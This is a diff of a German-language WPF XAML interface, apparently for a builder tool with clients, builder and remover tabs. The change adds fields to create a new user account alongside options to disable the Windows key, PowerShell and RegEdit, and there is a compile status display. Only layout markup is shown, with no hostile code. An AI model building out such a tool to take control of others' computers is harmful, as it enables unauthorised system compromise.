@@ -135,10 +135,10 @@
                 <TextBlock FontSize="16" VerticalAlignment="Center" HorizontalAlignment="Center">Remover</TextBlock>
             </Border>
         </Grid>
-        <Grid Grid.Row="1" x:Name="clientsGrid" Opacity="0">
+        <Grid Grid.Row="1" x:Name="clientsGrid" Opacity="1" IsEnabled="True" IsHitTestVisible="True">
             <TextBlock VerticalAlignment="Center" HorizontalAlignment="Center" FontSize="24">Noch keine Funktion, da keine TCP Verbindung entwickelt wurde.</TextBlock>    
         </Grid>
-        <Grid Grid.Row="1" x:Name="baukastenGrid">
+        <Grid Grid.Row="1" x:Name="baukastenGrid" Opacity="0" IsEnabled="False" IsHitTestVisible="False">
             <Grid.ColumnDefinitions>
                 <ColumnDefinition Width="1*"/>
                 <ColumnDefinition Width="3*"/>
@@ -335,7 +335,7 @@
                 </Border>
                 <Rectangle x:Name="activeTab" Grid.Row="1" Fill="#2288FF"></Rectangle>
             </Grid>
-            <Grid Grid.Column="1" x:Name="baukastenGrid1" Opacity="0" IsEnabled="False" IsHitTestVisible="False">
+            <Grid Grid.Column="1" x:Name="baukastenGrid1" Opacity="1" IsEnabled="True" IsHitTestVisible="True">
                 <Grid.ColumnDefinitions>
                     <ColumnDefinition Width="20"/>
                     <ColumnDefinition Width="1*"/>
@@ -393,7 +393,7 @@
                     <TextBlock VerticalAlignment="Center" HorizontalAlignment="Center" FontSize="14">Ändern...</TextBlock>
                 </Border>
             </Grid>
-            <Grid x:Name="baukastenGrid2" Grid.Column="1" Opacity="1" IsEnabled="True" IsHitTestVisible="True">
+            <Grid x:Name="baukastenGrid2" Grid.Column="1" Opacity="0" IsEnabled="False" IsHitTestVisible="False">
                 <Grid.ColumnDefinitions>
                     <ColumnDefinition Width="20"/>
                     <ColumnDefinition Width="1*"/>
@@ -480,6 +480,11 @@
                 <CheckBox x:Name="windowskeyCheckbox" Grid.Row="6" Grid.Column="1" Grid.ColumnSpan="2" VerticalAlignment="Center">Windows Taste deaktivieren</CheckBox>
                 <CheckBox x:Name="powershellCheckbox" Grid.Row="8" Grid.Column="1" Grid.ColumnSpan="2" VerticalAlignment="Center">Powershell deaktivieren</CheckBox>
                 <CheckBox x:Name="regeditCheckbox" Grid.Row="10" Grid.Column="1" VerticalAlignment="Center">RegEdit deaktivieren</CheckBox>
+                <CheckBox x:Name="createUserCheckbox" Checked="createUserCheckbox_Checked" Unchecked="createUserCheckbox_Unchecked" Grid.Column="4" Grid.ColumnSpan="2" VerticalAlignment="Center">Neuen Benutzer erstellen</CheckBox>
+                <TextBlock Grid.Column="4" Grid.Row="1" VerticalAlignment="Bottom">Benutzername</TextBlock>
+                <TextBox IsEnabled="False" x:Name="createUserUsernameTextbox" Grid.Row="2" Grid.Column="4" Grid.ColumnSpan="2" VerticalContentAlignment="Center" FontSize="18"></TextBox>
+                <TextBlock Grid.Column="4" Grid.Row="3" VerticalAlignment="Bottom">Passwort</TextBlock>
+                <PasswordBox IsEnabled="False" x:Name="createUserPasswortTextbox" Grid.Row="4" Grid.Column="4" Grid.ColumnSpan="2" VerticalContentAlignment="Center" FontSize="18"></PasswordBox>
             </Grid>
             <Grid x:Name="baukastenGrid4" Grid.Column="1" Opacity="0" IsEnabled="False" IsHitTestVisible="False">
                 <Grid.ColumnDefinitions>
@@ -590,7 +595,7 @@
                 <TextBlock x:Name="compileStatus" Grid.Column="1" Grid.ColumnSpan="5" Grid.Row="5" VerticalAlignment="Bottom"></TextBlock>
             </Grid>
         </Grid>
-        <Grid Grid.Row="1" x:Name="removerGrid">
+        <Grid Grid.Row="1" x:Name="removerGrid" Opacity="0" IsEnabled="False" IsHitTestVisible="False">
             
         </Grid>
     </Grid>
